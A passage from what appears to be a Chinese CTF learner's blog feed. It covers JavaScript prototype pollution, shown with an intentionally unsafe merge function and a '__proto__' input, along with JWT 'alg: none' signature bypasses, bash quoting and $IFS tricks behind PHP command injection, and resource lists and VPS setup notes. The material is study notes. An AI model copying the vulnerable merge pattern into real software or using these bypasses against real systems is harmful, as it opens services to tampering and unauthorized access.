class="line"></span><br><span class="line"><span class="comment">// 如果是在merge中，则可以通过对原有对象添加属性，直接修改所有prototype那个对象而不是替换指向</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// !!!总的来说，就是只能添加内容，不能整体替换指向，再本质就是要进入到对象中修改(merge中就是)</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="1-普通可控输入的原型链污染"><a href="#1-普通可控输入的原型链污染" class="headerlink" title="1. 普通可控输入的原型链污染"></a>1. 普通可控输入的原型链污染</h3><ol><li><p>示例代码</p><ol><li>污染的深度这里会受到限制，所以漏洞可否利用还要看<strong>原型是否一样</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">matrix[client.<span class="property">input1</span>][client.<span class="property">input2</span>]   </span><br><span class="line"><span class="comment">// 可以传入input1=&quot;__proto__&quot;来实现污染</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-Merge类型的原型链污染"><a href="#2-Merge类型的原型链污染" class="headerlink" title="2. Merge类型的原型链污染"></a>2. Merge类型的原型链污染</h3><ol><li><p>示例代码与前提</p><ol><li>json.parse()的递归不安全merge</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>为什么要json.parse()?</strong></em>: 在JavaScript中，JSON.parse()函数在处理JSON字符串时，会将JSON对象中的任何键视为任意字符串，包括<code>__proto__</code></p><ol><li>这里的<code>__proto__</code>并非是指向原型的属性，而是一个普通的自有属性(字符串)，可以被<code>getOwnProperties(&quot;__proto__&quot;)</code>和<code>hasOwnProperties(&quot;__proto__&quot;)</code>识别</li><li>过程：<code>__proto__</code> 属性仅仅是一个普通的自有属性，对象在查找属性时会在真正的原型上进行查找，但在执行 clone 函数的过程中，由于该属性名字的特殊性，触发了新对象的原型的修改，最终导致了 prototype pollution</li><li>如果是<em><strong>直接<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>的话</strong></em>，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型</li><li>JSON.parse中的原型链污染<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/JSONparse%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png" alt="Json.parse"><ol><li>详见权威报告，离别歌引用文章中有和<a href="https://xz.aliyun.com/t/2802?time__1311=n4+xni0=G=DQtAK0QD/8WpjrYDOboKbDBnhoD">先知社区</a></li></ol></li></ol></li><li><p>预防</p><ol><li>只需要在merge中加上小小的一段检验后跳过即可</li></ol></li></ol><h3 id="实战指南"><a href="#实战指南" class="headerlink" title="*实战指南"></a>*实战指南</h3><ol><li>有很多相关的函数(递归合并的话)，做题时重要的是思路的方向，然后根据具体的方向去查找更加重要，<em><strong>特征</strong></em><ol><li>merge</li><li>类似js这种没有严格访问控制属性的语言</li></ol></li><li>一些可以实战时查阅的资料<ol><li>火狐收藏夹</li><li>这篇不错<a href="https://xz.aliyun.com/t/12053?time__1311=GqGxR70Qi=itKGN4eeqBInO6Kf27EbD#toc-0">关于Prototype Pollution Attack的二三事</a></li><li>有一些cve<a href="https://www.freebuf.com/articles/web/275619.html">JavaScript原型链污染原理及相关CVE漏洞剖析</a></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_jwt</title>
      <link href="/2024/10/27/ctfshow_jwt/"/>
      <url>/2024/10/27/ctfshow_jwt/</url>
      
        <content type="html"><![CDATA[<h2 id="web345-alg-none"><a href="#web345-alg-none" class="headerlink" title="web345: alg: none"></a>web345: alg: none</h2><ol><li>这里就没有验证，理论来说可以随便改，主要问题在于目标目录端点问题<ol><li>***&#x2F;admin和&#x2F;admin&#x2F;***是不一样的</li></ol></li></ol><h2 id="web346-修改alg-none"><a href="#web346-修改alg-none" class="headerlink" title="web346: 修改alg: none"></a>web346: 修改alg: none</h2><ol><li>这里是修改算法为none，可以解决</li><li><strong>注意签名部分可以删掉</strong>，并且需要将sub变为admin</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从babyfirst-revengev2看bash中的字符串</title>
      <link href="/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>bash转义与换行问题<ol><li><a href="https://www.bookstack.cn/read/bash-tutorial/docs-quotation.md">阮一峰 挺好的教程</a></li></ol></li><li>其他参考资料见小部分中的如<code>无引用变量的拓展</code></li></ol><h2 id="php如何处理用户输入的字符串"><a href="#php如何处理用户输入的字符串" class="headerlink" title="php如何处理用户输入的字符串"></a>php如何处理用户输入的字符串</h2><ol><li><p>当处理用户输入的字符串(比如<code>$_GET</code>)并将其传递给系统命令时，PHP 本身不会自动为这些字符串添加引号，只是直接进行添加(什么样就放什么进去)，只有字面量才需要进行(单引号和双引号的考虑)</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="comment">// 输入?cmd=\&#x27;\&quot;&#x27;&quot;都可以正常输出</span></span><br></pre></td></tr></table></figure></li><li><p>对用户输入进行处理</p><ol><li><code>escapeshellarg()</code> 会确保 $user_input 被正确转义并用单引号包裹</li><li>需要转义整个命令字符串而不是单独的参数，可以使用 <code>escapeshellcmd()</code>。这个函数会转义可能被 shell 特别解释的字符，但不会添加引号</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line"><span class="variable">$safe_command</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$user_input</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$safe_command</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="bash中字符串的转义-无引号和单引号与双引号"><a href="#bash中字符串的转义-无引号和单引号与双引号" class="headerlink" title="bash中字符串的转义(无引号和单引号与双引号)"></a>bash中字符串的转义(无引号和单引号与双引号)</h2><ol><li><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8D%95%E5%BC%95%E5%8F%B7%E4%B8%8E%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E8%BD%AC%E4%B9%89%E5%8C%BA%E5%88%AB.png" alt="先上图"><ol><li>Bash 只有一种数据类型，就是字符串。不管用户输入什么数据，Bash 都视为字符串</li><li><em><strong>单引号只有一个意外，那就是&#39;</strong></em>: 单引号用于保留字符的字面含义，各种特殊字符在单引号里面，都会变为普通字符，比如星号（*）、美元符号（$）、反斜杠（\）等</li><li><em><strong>双引号</strong></em>: 双引号比单引号宽松，可以保留大部分特殊字符的本来含义，但是三个字符除外：美元符号（$）、反引号（&#96; ）和反斜杠（\）。也就是说，这三个字符在双引号之中，会被 Bash 自动扩展<ol><li>*号等通配符会原样进行输出</li><li>灵活性主要用于变量替换</li><li><strong>可以保持原有格式输出 -&gt; 不加双引号再echo中会丢失，在echo配合重定向中会出事(</strong><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%BF%9D%E6%8C%81%E6%A0%BC%E5%BC%8F.png" alt="bash中双引号保持格式"></li></ol></li></ol></li><li><em><strong>不使用引号的字符串</strong></em> –&gt; 更加详细要去到<strong>无引用变量的拓展</strong>这个标题处<ol><li>以<code>echo hello world</code>为例<ol><li>先上图<img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E6%B2%A1%E6%9C%89%E5%BC%95%E5%8F%B7%E7%9A%84echo.png" alt="echo字符串图"></li><li>无引号：当你不使用引号时，echo 命令会将每个单词视为一个单独的参数</li><li>双引号：当你使用双引号时，整个字符串被当作一个单一的参数传递给 echo</li></ol></li><li><strong>总结</strong>: 无引号字符串：Bash 会将字符串中的空格作为分隔符，并且会解释特殊字符和通配符 –&gt; 与双引号不同的是<code>cat *.txt</code>会进行通配符匹配，即会解析*</li><li>示例解读</li></ol></li></ol><h2 id="bash中的多行命令-部分"><a href="#bash中的多行命令-部分" class="headerlink" title="bash中的多行命令(部分)"></a>bash中的多行命令(部分)</h2><ol><li><em><strong>引号</strong></em>: 单双引号中的字符串字面量本身就可以多行输入和显示 -&gt; 不需要使用\来进行换行了<ol><li>本质: 换行符变成了普通字符而不能发挥作用</li></ol></li><li><em><strong>反斜杠\</strong></em>: 规则如下<ol><li><p>反斜杠 \ 放在一行的末尾，表示该行的结束不是命令的结束，而是继续到下一行</p><ol><li><strong>要搭配换行符使用才行</strong>: 最后一个反斜杠：如果一行以反斜杠 \ 结束，并且后面没有任何字符（包括空格），那么这个反斜杠会被视为普通字符，而不是续行符；后续有字符但是不是换行符也不会有换行作用</li></ol><blockquote><p>接下来这两个不太确定，ai说的但是实践出来不是<br>反斜杠 \ <strong>后面的所有空格都会被忽略</strong>。这意味着你可以使用多个空格或制表符来格式化代码，而不会影响命令的实际内容<br>如果反斜杠 \ 后面跟着的是注释符号 #，那么<strong>注释部分会被忽略</strong>，但反斜杠仍然会作为续行符</p></blockquote></li><li><p>当使用<code>bash -c</code>执行命令时，反斜杠 \ 也可以作为续行符在脚本文件中，反斜杠 \ 也可以用来将长命令拆分成多行</p></li><li><p>在脚本文件中，反斜杠 \ 也可以用来将长命令拆分多行</p></li></ol></li><li>还有here string和here doc的等其他篇吧，不要跑题太多了</li></ol><h2 id="Back-to-babyfirst-revengev2"><a href="#Back-to-babyfirst-revengev2" class="headerlink" title="Back to babyfirst-revengev2"></a>Back to babyfirst-revengev2</h2><h3 id="我的困惑"><a href="#我的困惑" class="headerlink" title="我的困惑"></a>我的困惑</h3><ol><li>Q: php命令执行会按照传入的command的引号吗，还是在bash层面进行处理</li><li>A: 已知php中底层的执行函数为<code>/bin/sh -c $command</code>(详见<code>phpm命令执行底层原理小记</code>)，<strong>调用链从近到远进行入手</strong><ol><li>Q: 此时与传入的<code>$command</code>有很大的关系，&#x2F;bin&#x2F;sh如何解释无引号字符?</li><li>A: slpit+glob，传入的命令中没有空格<code>$IFS</code>的话就是正常的<ol><li>Q: 那在<code>. _</code>调用脚本如何解释呢</li><li>A: php中直接作为输入导致，<strong>字符已经确定为一个整体</strong>，单引号和双引号只是解析的方式</li></ol></li><li><code>$command</code>是php传入的，php从用户的输入<code>$_GET[&#39;cmd&#39;]</code>处获取信息<ol><li>Q: php中判断是单引号还是双引号字符串<ol><li>从$_GET[]</li><li>用户输入获取的呢</li></ol></li><li>A: 直接作为输入，不管单双引号</li></ol></li></ol></li><li>理解<ol><li>!!! Notice 其实双引号和单引号是<strong>解析字符串的方式</strong>，存储在内部是不管引号的，去想象实际的字符</li><li>包括glob拓展后的列表</li></ol></li></ol><h3 id="无引用变量的拓展"><a href="#无引用变量的拓展" class="headerlink" title="*无引用变量的拓展"></a>*无引用变量的拓展</h3><ol><li>split and glob的概念<ol><li>ref<ol><li><a href="https://unix.stackexchange.com/questions/108963/expansion-of-a-shell-variable-and-effect-of-glob-and-split-on-it">stack exchange ref</a> –&gt; 有例子有概念，很不错</li><li><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion">gnu 官方文档</a><ol><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Filename-Expansion">拓展</a></li><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Word-Splitting">split</a></li></ol></li><li><em><strong>利用此特性的漏洞利用</strong></em><a href="https://medium.com/@bouss3id.abdelkader/unquoted-bash-variable-security-implications-bypassing-if-condition-in-bash-ctf-write-up-79648dc4e910">利用此特性的漏洞利用</a></li></ol></li><li>split: 在每个空格序列处将值拆分为单独的单词。(根据$IFS，可以更改为在非空格的字符处拆分。)因此，结果不再是一个字符串，而是一个<strong>字符串列表</strong>。如果值只包含空格，则此列表可以为空</li><li>glob: 将列表中的每个元素视为一个文件名模式，即一个glob。如果模式与某些文件匹配，则将其替换为匹配文件名的列表，否则将其保留 –&gt; 会进行glob匹配</li></ol></li><li>无引用变量<ol><li><p><code>cmd $var</code> -&gt; <code>cmd(glob(split($var)))</code>后面是一个列表</p></li><li><p><code>/bin/sh -c $cmd</code>也是按照上述的方式，<code>$IFS</code>中的值很重要</p><ol><li><strong>output $IFS in readable way</strong>: IFS的默认值是由空格、制表符和换行符组成的三个字符串<ol><li><code>echo &quot;$IFS&quot; | cat -et</code>(这里需要加上双引号)才会正常，直接$IFS不太行</li><li><code>echo &quot;$IFS&quot; | xxd</code>可以查看16进制</li></ol></li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="built_in">echo</span>\ <span class="built_in">test</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 无法正常运行</span></span><br><span class="line"><span class="variable">$IFS</span>= <span class="comment"># 这里是空格</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 可以正常运行，输出test</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="在bash-POSIX-shell中忘记引用变量的安全性影响"><a href="#在bash-POSIX-shell中忘记引用变量的安全性影响" class="headerlink" title="***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响"></a>***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响</h3><ol><li>Stack Exchange高关注议题<a href="https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells">Security implications of forgetting to quote a variable in bash&#x2F;POSIX shells</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言自学指南(2024持续更新)</title>
      <link href="/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/"/>
      <url>/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>中国油锯古瓦，自学才是效率最高的学习  </p><hr><ol><li>这里总结一下我搜集的各种资源(无视频)，其中有些也没看完&#x2F;只是浅浅过一遍  </li><li>同时，语言是不断发展的，这是2024年搜集到的(并不是2024年的)<br>总而言之：翻到这篇资源的伙伴请睁大你的眼睛</li></ol></blockquote><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><ol><li><a href="https://www.gnu.org/software/bash/manual/bash.html">gnu bash 2022官方文档</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/04/bash-tutorial.html">阮一峰</a></li><li><a href="https://tldp.org/LDP/abs/html/">Advanced Bash-Scripting Guide en</a></li><li><a href="https://www.shellscript.sh/">shell script</a></li><li><a href="https://www.shellscript.sh/">命令行的艺术</a></li></ol><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><ol><li><a href="https://zh.javascript.info/">js现代教程 真神</a></li><li><a href="https://nodejs.org/en/learn/getting-started/introduction-to-nodejs">node.js</a></li><li><a href="https://expressjs.com/">express.js</a></li><li><a href="https://vuejs.org/guide/introduction.html">vue3 有中文版</a></li></ol><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><ol><li><a href="https://liaoxuefeng.com/books/java/">廖雪峰</a></li><li><a href="https://pdai.tech/md/java/">java全栈指南</a></li><li><a href="https://javaguide.cn/java/">java guide</a></li></ol><h2 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h2><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><blockquote><p>用好vim这个工具可以大大提高效率，Vscode+Vim+Win是可以配置出一套极少需要鼠标的工作流操作的</p></blockquote><ol><li><a href="https://docs.kilvn.com/vim_zh_cn/">learn vim中文版</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php命令执行底层原理的小记</title>
      <link href="/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>起源来自hitcon 2017 babyfirst-revenge和babyfirst-revengev2中关于转义\处理的问题，折腾我一个晚上(生气) -&gt; 最后感谢v1nd大哥</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>php命令执行底层原理<ol><li><a href="https://qftm.github.io/2020/12/01/command-execution-research-php/">其实看这篇就好了，只是自己总结一下，没有太考虑阅读感受(比较精简)</a></li><li><a href="https://xz.aliyun.com/t/6542?time__1311=n4+xnD0Dg7G=74xBkbDyDmrEDuGDBlOcGOYrYD">命令执行成因小注</a></li><li><a href="https://zhuanlan.zhihu.com/p/339071601">知乎安全客，像是第一篇的转载</a></li></ol></li></ol><h2 id="Linux下的命令执行"><a href="#Linux下的命令执行" class="headerlink" title="Linux下的命令执行"></a>Linux下的命令执行</h2><ol><li>分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>通过<code>type echo</code>和<code>which whoami</code>可以知道，可以通过<code>enable</code>和<code>help</code>来查看内建指令<ol><li>其中<code>/bin</code>是一个指向<code>/usr/bin</code>的链接文件噢</li></ol></li><li><em><strong>Difference</strong></em><ol><li>shell会查找command是否为built-in command类型，对于built-in command指令类型，shell会自己解释执行，而无需fork一个child process子进程来执行该command指令；</li><li>对于，不是built-in command指令类型，shell会从环境变量中按顺序搜索该command指令，如果能查到则会fork一个child process子进程来执行该command指令；然而，对于找不到的command指令，一般为：执行的指令不存在、指令未加入到环境变量中</li></ol></li></ol></li></ol><h2 id="Windows下的命令执行"><a href="#Windows下的命令执行" class="headerlink" title="Windows下的命令执行"></a>Windows下的命令执行</h2><ol><li>同linux一样，分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>使用<code>where cd</code>或者<code>set path=</code>后使得path&#x3D;(null)来调用命令共两种方法可以进行区分<ol><li>where中显示找不到但是可以执行的命令为内建命令，找得到的都是非内建的</li><li><code>set path=</code>后可以执行的为内建命令，不可以执行的是外部命令</li><li>无法使用<code>help</code>命令(本生是外键)，会把所有内+外都列出来</li></ol></li></ol></li><li>差异也是会不会开子进程的情况</li></ol><h2 id="Sytem-Execution-Func-in-different-lang"><a href="#Sytem-Execution-Func-in-different-lang" class="headerlink" title="Sytem Execution Func in different lang"></a>Sytem Execution Func in different lang</h2><blockquote><p>命令执行函数执行分为两类，一类：传入的命令仅仅作为可执行终端中的命令执行；另一类：传入的命令仅仅是运行传入的命令中的可执行程序。对象不同，一类：是底层语言系统终端帮我们执行传入的命令；另一类：是自己启动传入的可执行程序。</p></blockquote><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c Command</span><br></pre></td></tr></table></figure><ol><li>linux和windows都有追踪<em><strong>程序流的工具</strong></em><ol><li>linux: strace</li><li>windows: OD动态调试，微软官方提供的Process Explorer工具进行跟踪分析</li></ol></li><li>命令执行函数在bash中调用的命令是<code>/bin/sh -c &quot;...&quot;</code><ol><li>这里单引号和双引号一样，都可以变量替换 -&gt; <code>/bin/sh -c &#39;echo $SHELL&#39;</code>也可以正确输出</li></ol></li><li>在<code>system</code>的实验下都只是调用了一个子进程<code>/bin/sh</code></li><li>Shell 执行：PHP 中的shell_exec 、 exec和system等函数调用系统的 shell（通常为&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash ）来执行命令。这意味着他们启动一个新的 shell 进程来解释您提供的命令字符串</li></ol><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 与php不同的模型</span></span><br><span class="line">Java - 底层不调用系统终端，自己启动传入的可执行程序    Mode =&gt; Window：Command || Linux：Command</span><br></pre></td></tr></table></figure><ol><li>在Java语言里面，针对Linux平台，系统命令<code>echo 111 &gt; shell.txt</code>传入CommandExecFunc函数，最终在底层相当于执行<code>/bin/echo 111 &gt; shell.txt</code><ol><li>这里的echo作为可执行程序出现，而不是终端中的命令，没有整体再次进行解释</li></ol></li><li>window中也一样</li><li>无 Shell 开销：由于 Java 默认情况下不通过 shell，因此您可以更直接地控制命令的执行，但这也意味着您可能需要自己处理环境变量、命令行解析和输出重定向（如果需要）</li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 和php一样</span></span><br><span class="line">Python - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c Command</span><br></pre></td></tr></table></figure><h2 id="Dive-into-PHP"><a href="#Dive-into-PHP" class="headerlink" title="Dive into PHP"></a>Dive into PHP</h2><blockquote><p>重点关注: system, exec, shell_exec, passthru 四个函数</p></blockquote><ol><li><p>这一部分就详见qftm的文章吧，写的很好，我来小小<em><strong>总结</strong></em></p><ol><li><p>linux中system、exec、passthru、shell_exec这类命令执行函数底层在linux中都是调用<code>/bin/sh -c &#39;...&#39;</code>这样的，是通过源码看出来的 –&gt; 这里的&#x2F;bin&#x2F;sh在不同平台中所指向的链接不同，debian系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;dash；redhat系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;bash</p><blockquote><p>最初，bash是GNU&#x2F;Linux 操作系统中 &#x2F;bin&#x2F;sh 的符号链接，但由于bash过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash，且&#x2F;bin&#x2F;sh符号连接到dash。Dash Shell 比 Bash Shell 小的多（ubuntu16.04上，bash大概1M，dash只有150K），符合POSIX标准。Ubuntu 6.10开始默认是Dash。</p></blockquote></li><li><p>windows中都是cmd.exe</p></li><li><p><em><strong>QUICK判断</strong></em>: 如果单纯的是想知道某个命令执行函数是否调用cmd.exe终端去执行系统指令的话，可以在php脚本里面写一个循环，然后观察进程创建情况即可：简单、粗暴</p></li></ol></li><li><p>关于exec()</p><ol><li>在官方手册的评论中有这样一句话，很是受益，平时找的时候可以关注一下评论<a href="https://www.php.net/function.exec">111</a></li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In Windows, <span class="built_in">exec</span>() issues an internal call to <span class="string">&quot;cmd /c your_command&quot;</span>. This implies that your <span class="built_in">command</span> must follow the rules imposed by cmd.exe <span class="built_in">which</span> includes an extra <span class="built_in">set</span> of quotes around the full <span class="built_in">command</span>:</span><br><span class="line"></span><br><span class="line">- http://ss64.com/nt/cmd.html</span><br><span class="line"></span><br><span class="line">Current PHP versions take this into account and add the quotes automatically, but old versions didn<span class="string">&#x27;t.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apparently, the change was made in PHP/5.3.0 yet not backported to 5.2.x because it&#x27;</span>s a backwards incompatible change. To <span class="built_in">sum</span> up:</span><br><span class="line"></span><br><span class="line">- In PHP/5.2 and older you have to surround the full <span class="built_in">command</span> plus arguments <span class="keyword">in</span> double quotes</span><br><span class="line">- In PHP/5.3 and greater you don<span class="string">&#x27;t have to (if you do, your script will break)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you are interested in the internals, this is the source code:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sprintf(cmd, &quot;%s /c \&quot;%s\&quot;&quot;, TWG(comspec), command); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It can be found at http://svn.php.net/viewvc/ (please find php/php-src/trunk/TSRM/tsrm_win32.c, the comment system doesn&#x27;</span>t allow the direct <span class="built_in">link</span>).</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf3r的第一台vps(2024)</title>
      <link href="/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/"/>
      <url>/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/</url>
      
        <content type="html"><![CDATA[<blockquote><p>给曾经一窍不通的自己的总结，其实看官方文档就ok了，这一篇做一个记录，后面忘记了也可以quick start</p></blockquote><h2 id="1-购买服务器"><a href="#1-购买服务器" class="headerlink" title="1. 购买服务器"></a>1. 购买服务器</h2><ol><li>建议<ol><li>看看优惠页面，直接搜索即可</li><li>看看试用</li><li>如果是学生的话搜索时添加个学生就够了</li><li>入门的话感觉瞄准阿里云(免费额度也够)就好了，不用太在不同平台间挣扎浪费时间</li></ol></li><li>我现在暂时用的是阿里云的服务器试用，美味的白嫖<ol><li>注意自己注意时间，给的是要3个月内使用的300元体验</li><li>一个月检查一次吧</li></ol></li></ol><h2 id="2-配置-vscode"><a href="#2-配置-vscode" class="headerlink" title="2. 配置 + vscode"></a>2. 配置 + vscode</h2><ol><li><a href="https://help.aliyun.com/zh/ecs/getting-started/getting-started?spm=a2c4g.11186623.0.0.4802629cDcbhgp">看看官方入门文档</a></li><li>安全组设置<ol><li>点击快速配置中有http, https, ssh, rdp就够了，配置后记得切换使用这个的</li></ol></li><li>配置一下密钥对<ol><li>有一些没有可以选择root或者ecs-user的机型可能会有出现无法登录root的情况 –&gt; <a href="https://help.aliyun.com/zh/ecs/use-cases/log-on-to-a-linux-instance-by-using-an-ssh-key-pair-as-a-regular-user">看看这篇</a></li><li>还要给自己的新用户增加sudo用户组后续方便操作，阿里云自己的操作系统是centos系的，查看组<code>cat /etc/group</code>，<code>usermod -aG wheel username</code>后<code>groups username</code>一下</li></ol></li><li>接着就直接在vscode中搞一下<ol><li>连接配置<ol><li>wsl无法再连向远程了，cs144是因为再容器中；需要再windows中设置</li></ol></li><li>文件传输配置(local-&gt;remote) –&gt; 无法remote-&gt;local, 否则我就不用来开vps了<ol><li>在windows中使用的，可以直接cv</li><li>也可以考虑wsl文件先放到Win中，然后win中在终端传到云服务器上<ol><li>wsl中设置环境变量<code>YUN</code>方便将文件传入到windows中<code>cp my_file 